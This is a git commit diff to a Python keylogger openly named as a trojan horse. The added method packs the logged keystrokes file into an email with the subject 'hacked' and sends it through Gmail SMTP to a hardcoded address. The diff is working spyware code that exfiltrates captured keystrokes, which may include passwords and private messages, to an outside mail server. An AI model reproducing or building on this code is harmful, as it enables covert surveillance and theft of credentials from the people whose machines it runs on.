b8c13fe24e9abf2ed019e83eaa6882fd202ce140
sidharthvnair02 <82643868+sidharthvnair02@users.noreply.github.com>
2021-05-20 15:29:58 +0530

    Update keylogger(trojan horse).py

--- keylogger(trojan horse).py
+++ keylogger(trojan horse).py
@@ -21,3 +21,23 @@ class KeyLogger():
         print(key)
         with open(self.filename, 'a') as logs:
             logs.write(f'{self.get_char(key)}\n')
+    def on_release(self, key):
+        if key==Key.esc:
+            message = EmailMessage()
+            sender = "pythonproject.py@gmail.com"
+            recipient = "pythonproject.py@gmail.com"
+            message['From'] = sender
+            message['To'] = recipient
+            message['Subject'] = 'hacked'
+            body = """keylogs"""
+            message.set_content(body)
+            mime_type, _ = mimetypes.guess_type('keylogs.txt')
+            mime_type, mime_subtype = mime_type.split('/')
+            with open('keylogs.txt', 'rb') as file:
+                message.add_attachment(file.read(),maintype=mime_type,subtype=mime_subtype,filename='keylogs.txt')
+
+            mail_server = smtplib.SMTP_SSL('smtp.gmail.com')
+            mail_server.set_debuglevel(1)
+            mail_server.login("pythonproject.py@gmail.com", '') 
+            mail_server.send_message(message)
+            mail_server.quit()
